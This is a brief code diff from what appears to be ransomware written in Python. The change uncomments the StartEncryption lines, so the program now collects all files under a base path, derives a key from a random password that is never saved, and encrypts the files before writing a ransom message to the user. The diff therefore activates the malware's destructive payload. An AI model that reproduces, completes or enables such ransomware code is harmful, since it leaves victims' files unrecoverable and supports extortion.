@@ -69,10 +69,10 @@ def WriteUserMessage():
         ransomFile.write(ransom_message)
 
 def StartEncryption():
-    #files_to_encrypt = GetAllFiles(base_path)
-    #password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
-    #key = SHA256.new(password.encode('utf-8')).digest()
-    #EncryptAllFiles(files_to_encrypt, key)
+    files_to_encrypt = GetAllFiles(base_path)
+    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
+    key = SHA256.new(password.encode('utf-8')).digest()
+    EncryptAllFiles(files_to_encrypt, key)
     WriteUserMessage()
 
 ###################### main ######################
